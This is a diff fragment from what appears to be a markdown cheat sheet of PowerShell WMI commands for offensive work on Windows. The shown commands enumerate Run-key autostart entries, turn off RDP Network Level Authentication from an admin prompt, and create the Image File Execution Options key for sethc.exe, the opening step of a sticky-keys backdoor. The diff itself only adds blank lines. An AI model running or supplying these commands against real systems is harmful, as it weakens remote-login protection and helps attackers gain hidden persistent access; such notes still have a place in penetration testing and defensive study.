@@ -26,6 +26,7 @@ foreach ($key in $uninstall_keys.sNames){
 #### Read registry, enumerate Run keys
 ````
 $sub_keys = Invoke-Wmimethod -Namespace root\default -Class StdRegProv -Name EnumValues @(2147483649, "Software\Microsoft\Windows\CurrentVersion\Run")
+
 foreach ($key in $sub_keys.sNames){
   $object = Invoke-Wmimethod -Namespace root\default -Class StdRegProv -Name GetStringValue @(2147483649, "Software\Microsoft\Windows\CurrentVersion\Run",$key)
   Write-Output $object.sValue
@@ -36,6 +37,7 @@ foreach ($key in $sub_keys.sNames){
 From an admin prompt, 
 ````
 (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
+
 Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'"
 
 Invoke-Wmimethod -Namespace root\default -Class StdRegProv -Name CreateKey @(2147483650, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe")
